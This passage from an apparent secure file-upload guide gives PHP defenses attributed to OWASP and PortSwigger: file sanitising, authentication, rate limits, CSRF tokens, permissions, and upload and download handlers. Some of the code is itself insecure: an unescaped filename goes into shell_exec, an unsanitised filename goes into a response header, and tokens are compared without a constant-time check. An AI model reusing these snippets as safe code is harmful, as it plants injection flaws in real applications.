    if($type == 'pdf') {
        // Extract text and safe elements only
        // Rebuild PDF without scripts, macros, embedded files
        
        // Libraries: pdf-parser, PyPDF2, pdftk
        $output = shell_exec("pdftk $file output clean.pdf uncompress");
        
        // Remove JavaScript, embedded files
        $content = file_get_contents('clean.pdf');
        $content = preg_replace('/\/JavaScript.*?>>/', '', $content);
        $content = preg_replace('/\/EmbeddedFiles.*?>>/', '', $content);
        file_put_contents('clean.pdf', $content);
        
        return 'clean.pdf';
    }
    
    if($type == 'docx') {
        // DOCX is ZIP archive
        // Extract, remove macros, rebuild
        
        // Remove vbaProject.bin (contains macros)
        $zip = new ZipArchive();
        $zip->open($file);
        $zip->deleteName('word/vbaProject.bin');
        $zip->close();
        
        return $file;
    }
}
?>
```

### Defense Layer 8: Access control (OWASP)

**From OWASP - Authentication & authorization:**
```php
<?php
// Require authentication
session_start();
if(!isset($_SESSION['user_id'])) {
    die("Login required");
}

// Rate limiting (per user)
$userId = $_SESSION['user_id'];
$uploadCount = getUploadCount($userId, last_hour);

if($uploadCount > 10) {
    die("Upload limit exceeded (10 per hour)");
}

// Storage quota
$userStorage = getUserStorageUsed($userId);
$maxStorage = 100 * 1024 * 1024;  // 100MB per user

if($userStorage >= $maxStorage) {
    die("Storage quota exceeded");
}

// Log all uploads
logUpload($userId, $filename, $filesize, $_SERVER['REMOTE_ADDR']);
?>
```

### Defense Layer 9: CSRF protection (OWASP)

**From OWASP - Prevent CSRF upload:**
```php
<?php
// Generate CSRF token
session_start();
if(empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>

<!-- In upload form -->
<form action="/upload" method="post" enctype="multipart/form-data">
    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

<?php
// Validate token on upload
if($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF token validation failed");
}
?>
```

### Defense Layer 10: Filesystem permissions (OWASP)

**From OWASP - Least privilege:**
```bash
# Upload directory permissions
chmod 755 /var/www/uploads/  # rwxr-xr-x

# Individual files
chmod 644 uploaded_file.jpg   # rw-r--r--

# Ownership
chown www-data:www-data /var/www/uploads/

# Disable execution bit
chmod -R -x /var/www/uploads/*
```

**In code:**
```php
<?php
// Set restrictive permissions on upload
$destination = '/var/www/uploads/' . $filename;
move_uploaded_file($temp, $destination);

// Set read-only for web server user
chmod($destination, 0644);  // rw-r--r--
chown($destination, 'www-data');
?>
```

## Complete secure upload implementation

**Combining all defenses (PortSwigger + OWASP):**
```php
<?php
session_start();

// 1. Authentication (OWASP)
if(!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die(json_encode(['error' => 'Authentication required']));
}

// 2. CSRF protection (OWASP)
if($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    http_response_code(403);
    die(json_encode(['error' => 'CSRF validation failed']));
}

// 3. Rate limiting (OWASP)
$userId = $_SESSION['user_id'];
if(getUserUploadCount($userId, 3600) > 10) {
    http_response_code(429);
    die(json_encode(['error' => 'Rate limit exceeded']));
}

// 4. File upload check
if(!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
    http_response_code(400);
    die(json_encode(['error' => 'Upload failed']));
}

$file = $_FILES['file'];
$tempFile = $file['tmp_name'];

// 5. Size validation (OWASP)
$maxSize = 5 * 1024 * 1024;  // 5MB
if($file['size'] > $maxSize || $file['size'] < 100) {
    http_response_code(400);
    die(json_encode(['error' => 'Invalid file size']));
}

// 6. Extension whitelist (PortSwigger + OWASP)
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$originalName = basename($file['name']);
$extension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));

if(!in_array($extension, $allowedExtensions)) {
    http_response_code(400);
    die(json_encode(['error' => 'File type not allowed']));
}

// 7. MIME type validation (OWASP)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $tempFile);
finfo_close($finfo);

$allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
if(!in_array($mimeType, $allowedMimes)) {
    http_response_code(400);
    die(json_encode(['error' => 'Invalid file type']));
}

// 8. Content validation (PortSwigger)
$imageInfo = getimagesize($tempFile);
if($imageInfo === false) {
    http_response_code(400);
    die(json_encode(['error' => 'Not a valid image']));
}

// 9. Image rewriting (OWASP - destroys embedded code)
$image = imagecreatefromstring(file_get_contents($tempFile));
if($image === false) {
    http_response_code(400);
    die(json_encode(['error' => 'Image processing failed']));
}

$cleanedFile = tempnam(sys_get_temp_dir(), 'img_');
imagejpeg($image, $cleanedFile, 90);
imagedestroy($image);

// 10. Antivirus scan (OWASP)
$scanResult = scanFileWithClamAV($cleanedFile);
if($scanResult === 'malware') {
    unlink($cleanedFile);
    http_response_code(400);
    die(json_encode(['error' => 'Malware detected']));
}

// 11. Generate secure filename (OWASP)
$newFilename = bin2hex(random_bytes(16)) . '.' . $extension;

// 12. Store outside webroot (OWASP priority 2)
$uploadDir = '/var/file_storage/uploads/' . $userId . '/';
if(!is_dir($uploadDir)) {
    mkdir($uploadDir, 0755, true);
}

$destination = $uploadDir . $newFilename;

// 13. Move with error handling
if(!rename($cleanedFile, $destination)) {
    http_response_code(500);
    die(json_encode(['error' => 'Storage failed']));
}

// 14. Set restrictive permissions (OWASP)
chmod($destination, 0644);

// 15. Log upload (OWASP)
logFileUpload($userId, $originalName, $newFilename, $file['size'], $_SERVER['REMOTE_ADDR']);

// 16. Return file ID (not path)
$fileId = insertFileRecord($userId, $newFilename, $originalName, $file['size']);

http_response_code(200);
echo json_encode([
    'success' => true,
    'file_id' => $fileId  // Use ID, not filename
]);
?>
```

**File retrieval (secure):**
```php
<?php
// download.php
session_start();

if(!isset($_SESSION['user_id'])) {
    http_response_code(401);
    die('Authentication required');
}

$fileId = $_GET['id'] ?? '';
$userId = $_SESSION['user_id'];

// Get file metadata
$file = getFileById($fileId);

if(!$file) {
    http_response_code(404);
    die('File not found');
}

// Authorization check
if($file['user_id'] !== $userId && !isAdmin($userId)) {
    http_response_code(403);
    die('Access denied');
}

// Construct path (outside webroot)
$filePath = '/var/file_storage/uploads/' . $file['user_id'] . '/' . $file['filename'];

if(!file_exists($filePath)) {
    http_response_code(404);
    die('File not found');
}

// Force download (never execute)
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="' . $file['original_name'] . '"');
header('Content-Length: ' . filesize($filePath));
header('X-Content-Type-Options: nosniff');  // Prevent MIME sniffing

readfile($filePath);
exit;
?>
```
